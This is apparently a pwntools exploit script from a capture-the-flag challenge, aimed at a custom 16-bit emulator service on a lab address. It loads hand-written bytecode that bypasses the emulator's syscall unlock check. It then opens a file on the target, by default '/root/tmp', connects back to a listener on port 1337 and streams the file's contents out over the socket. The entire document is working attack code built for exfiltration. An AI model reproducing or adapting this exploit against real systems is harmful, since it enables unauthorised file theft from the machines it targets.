from pwn import *
import socket
import sys

target = ( '192.168.56.101', 6666 )
connback = ( '192.168.56.101', 1337 )

try:
    path = sys.argv[1]
except:
    path = '/root/tmp'

context.bits = 16
context.endian = 'big'

align = lambda s: s+'\0' if len(s) & 1 else s
bswap16 = lambda s: ''.join( s[i:i+2][::-1] for i in xrange( 0, len(s), 2 ))
string = lambda s: bswap16( align( s ))

connback_ip = bswap16( socket.inet_aton( connback[0] ))
connback_port = pack( connback[1], endianness='little' )

program = flat(
## Unlock syscall
    0xFA01,     # GPR[0], GPR[1] = rand_1, rand_2
    0x5210,     # GPR[2] = GPR[0] * GPR[1]
    0x6B10,     # GPR[3] = cmp( GPR[0], GPR[1] )
    0xC013,     # if GPR[3] > 0: goto PC+1*2
        0xF422, #   GPR[2] = -GPR[2]
    0x6B12,     # GPR[3] = cmp( GPR[1], GPR[2] )
    0xC013,     # if GPR[3] > 0: goto PC+1*2
        0xF510, #   GPR[0] = GPR[1]
    0x4120,     # GPR[1] = GPR[0] ^ GPR[2]
    0xF520,     # GPR[0] = GPR[2]
    0xFA03,     # unlock

## Prepare file and socket
    0xE00C,     # load GPR[3~0]
    0xF900,     # syscall GPR[0] (fopen)
    0xF930,     # syscall GPR[3] (socket)

    0xE808,     # load GPR[7~0]
    0xF900,     # syscall GPR[0] (connect)

## Prepare for the pump loop
    0xE814,     # load GPR[7~0]
    0xD013,     # goto PC+19*2

## Constants
    0x0FA4,     # GPR[3] = SYSCALL_SOCKET
    0x0005,     # GPR[2] = 5
    0x0000,     # GPR[1] = filename
    0x0FA1,     # GPR[0] = SYSCALL_FOPEN

    connback_port,  # GPR[4] = port
    connback_ip,    # GPR[3] = lo( IPv4 ), GPR[2] = hi( IPv4 )
    0x0000,         # GPR[1] = 0
    0x0FA9,         # GPR[0] = SYSCALL_CONNECT = 0x0FA9

    0x0FA8,     # GPR[7] = SYSCALL_EXIT
    0x0FA6,     # GPR[6] = SYSCALL_WRITE
    0x0FA3,     # GPR[5] = SYSCALL_FREAD
    0x0100,     # GRP[4] = max_size = 0x100
    0x0000,     # GPR[3] = buffer = 0x3F00
    0x0100,     # GPR[2] = size = 0x100
    0x0000,     # GPR[1] = GPR[1] ^ GPR[1] = 0

## Pump from file to socket
    0xF502,     # GPR[2] = GPR[0]
    0xF960,     # syscall GPR[6] (write)
    0xF542,     # GPR[2] = GPR[4]
    0xF950,     # syscall GPR[5] (fread)
    0xCFB0,     # if GPR[0] > 0: goto PC+(-5)*2

## Exit
    0xF970,     # syscall GPR[7] (exit)
)

def load( base, data ):
    data = align( data )
    conn.send( ''.join( 'ww %X %X\n' % (base+i,u16(data[i:i+2])) for i in xrange( 0, len( data ), 2 ) if u16(data[i:i+2])))

conn = remote( *target )
load( 0x0000, string( path ) )
load( 0x4000, program )
conn.sendline( 'run' )
conn.recvuntil( 'Simulation ending.' )
